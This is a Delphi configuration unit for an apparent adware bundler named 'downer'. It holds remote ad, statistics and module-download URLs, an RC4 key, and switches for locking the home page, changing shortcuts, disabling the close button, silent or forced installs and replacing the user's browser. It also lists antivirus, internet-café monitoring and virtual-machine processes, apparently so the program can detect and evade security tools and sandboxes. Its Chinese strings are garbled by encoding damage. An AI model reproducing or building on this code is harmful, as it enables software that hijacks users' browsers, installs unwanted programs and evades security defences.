unit UnitConfig;

interface

uses
  Windows, Classes, Messages, UnitType, msxml, SysUtils, StrUtils, DUIiniFiles,
  RemoteModule;

var
  bIsDebug: Boolean = False;
  BugFileName: string = 'downer_3@01131.exe';

const
  USER_Message = WM_USER + 100;
  USER_QueryMutex = USER_Message + 5;
  USER_SOCK_DOWN_STOP = USER_Message + 4;
  USER_BARICON = USER_Message + 6;
  USER_CLOSE_CHILD = USER_Message + 7;
  AppName = '����������';
  AppEnName = 'downer';
  VersionStr = '2.1.0.0';
  TipIconText = '����򿪸���������'; 
  
  //QueryWebUrl = 'http://beta.jiekou.zheguow.com/ad/';
  //taskReferUrl = 'http://jiekou.zheguow.com/stat';
  //ErrorReferUrl = 'http://jiekou.zheguow.com/error';
  //RemoteModuleUrl = 'http://jiekou.zheguow.com/md';
  QueryWebUrl = 'http://api.zheguow.com/ad/';
  taskReferUrl = 'http://api.zheguow.com/stat';
  ErrorReferUrl = 'http://api.zheguow.com/error';
  RemoteModuleUrl = 'http://api.zheguow.com/md';

  TaskXmlExt = '';

  DefaultWebID: string = '1';
  DefaultSoftID: string = '0';
  APIErrWebID: string = '3'; 
  FrmLoadWidth = 260;
  FrmLoadHeight = 180;
  FrmMainWidth = 600;
  FrmMainHeight = 400;
  FrmADVWidth = 141;
  FrmADVHeight = 400;
  FrmADVBodyWidth = 139;
  FrmADVBodyHeight = 363;
  TopADVBodyWidth = 200;
  TopADVBodyHeight = 33;
  //AdWebWidth = 520;
  //AdWebHeight = 240;
  AdWebWidth = 558;
  AdWebHeight = 268;
  hShowFrmInstallWait: Integer = 15000;
  bDownToMaxDriver: Boolean = True; 
  bForceGetWebXml: Boolean = True; 
  bUploadSafeSoft: Boolean = True; 
  bForceOpenSoft: Boolean = False; 
  bDownFailOpen: Boolean = True; 

  strRC4PassWord: AnsiString = 'downer';

var
  WebInfo: TWebXmlInfo;
  SoftInfo: TSoftXmlInfo;
  ADVInfo: TADVXmlInfo;
  hAppMutex: THandle = 0; 
  MutexName: string; 
  DataPath: string = '';
  IconPath: string = ''; 
  WorkPath: string = ''; 
  ExeName: string = ''; 
  MacStr: string = '';
  DesktopPath: string = ''; 
  RegModuleStr: string = ''; 
  BaiduSearchUrl: string = 'https://www.baidu.com/s?wd=%s'; 
  nUsesNumber: Integer = 0; 
  nStartTime: Cardinal = 0;
  bShowInstallFrm: Boolean = False;
  RMManager: TRomoteManager; 
  RMManager2: TRomoteManager; 
  ChkCapColor: Cardinal = $FF090909;
  ChkTipColor: Cardinal = $FF666666;
  FrmMainBk: Cardinal = $FFFFFFFF;

  bIsWin64: Boolean; 
  bIsDeveloper: Boolean = False; 
  IEVersionStr: string;
  ErrorNum: Integer = 0;
  bFirstLevelCity: Boolean = True; 
  hUserEV: DWORD = 0; 
  
  bLoadXmlOk: Boolean = False; 
  bReferTasked: Boolean = False; 
  WebXmlStr: string = ''; 
  WebXml: IXMLDOMDocument;
  TaskList: array [0 .. 4] of TTaskInfoList;
  TaskAltList: TTaskInfoList;
  adweburl: array [0 .. 1] of string;
  oncloseUrl: string;
  bInstallEd: Boolean = False; 
  bInstallEdSilent: Boolean = False; 
  StepNumber: Integer = 0; 
  bQueryTaskClose: Boolean = True;
  Refershow, Refercheck, Referuncheck, Referrepeat, Referok,
    Refererror: string; 
  DownTaskTryNum: Integer = 3;
  //TopADVStatisticsUrl: string = 'http://beta.jiekou.zheguow.com/topadcount';
  TopADVStatisticsUrl: string = 'http://api.zheguow.com/topadcount';

  bForceInstall: Boolean = False; 
  bChangeLnk: Boolean = False; 
  bLockHomePage: Boolean = False; 
  bOpenFolderInstall: Boolean = False; 
  bShowGrayChk: Boolean = False; 
  bHideExtend: Boolean = False; 
  bDisableClose: Boolean = False; 
  bUseCityRule: Boolean = False; 
  bDownHideToTask: Boolean = False; 
  bDownToDesktop: Boolean = False; 
  bLockTaskBar: Boolean = False; 
  bSwitchIELast: Boolean = False;
  bInduceExit: Boolean = False; 
  bAlterRank: Boolean = False; 
  bExitInduceStart: Boolean = False; 
  bDebugReport: Boolean = False; 
  bSwitchBtnYes: Boolean = False; 
  bLastTaskSiteDown: Boolean = False; 
  bShowTaskItemText: Boolean = False; 
  bReplace360Browser: Boolean = False; 
  bSwitch360Last: Boolean = False; 
  
  BrowserRule: TBrowserRuleArray;
  BrowserStartUrl: string;
  BrowserRuleString: string;
  
  bHttpStartUp: Boolean = False; 
  DownloadID: Cardinal = 0;
  DownLoadPath: string; 
  AppDownPathName: string = 'MyDownloads';
  DownloadFilePath: string; 
  AutoDeleteFile: Boolean = False;
  FbDowning: Boolean = False;
  bShowThunderBtn: Boolean = False;
  bDownLoadOK: Boolean = False; 

{$IFDEF USE_XLSDK}
  InitThundered: Boolean = False;
  XlMainTaskID: THandle = 0; 
  HisConfig: TDUIiniFiles;
  MainDownHis: THisConfigInfo; 
  bHisDownOk: Boolean = False; 
{$ENDIF}

  SAFESOFT: array [0 .. 5] of string = (
    '360tray.exe',
    '360sd.exe',
    'QQPCTray.exe',
    'kxetray.exe',
    'BaiduSdTray.exe',
    'BaiduAnTray.exe'
  );
  
  WANGBASOFT: array [0 .. 18] of string = (
    'ShadowTip.exe',
    'PowerRemind.exe', 
    'wanxiang.exe',
    'clsmn.exe', 
    'pubwin.exe', 
    'UKeyMain.exe',
    'UDO.exe',
    'duduniu.exe', 
    'Jfwclient.exe', 
    'ssp.exe', 
    'mpclient.exe', 
    'fzclient.exe', 
    'TLnbLdr.exe', 
    'yqsclient.exe',
    'barrms.exe',
    'yaoqianshu.exe', 
    'RzxMon.exe',
    'rzxsvr.exe', 
    'BarClientView.exe' 
  );
  
  VMSOFT: array [0 .. 1] of string = (
    'VBoxService.exe', 
    'vmtoolsd.exe' 
  );

implementation

initialization

begin

  BrowserRuleString := 
    'Internet Explorer*=iexplore.exe|Int*xp*er*=iexplore.exe|' +
    'Google Chrome=chrome.exe|QQ�����=QQBrowser.exe|' +
    '�ѹ�*�����=SogouExplorer.exe|2345*�����=2345Explorer.exe|���������=2345chrome.exe|�Ա�*�����=liebao.exe' + '|����*�����=Maxthon.exe|UC�����=UCBrowser.exe|����֮��*=TheWorld.exe|Opera=opera.exe|Mozilla Firefox*=firefox.exe|�ٶ������=baidubrowser.exe|ǧѰ=qianxun.exe';
end;

end.
 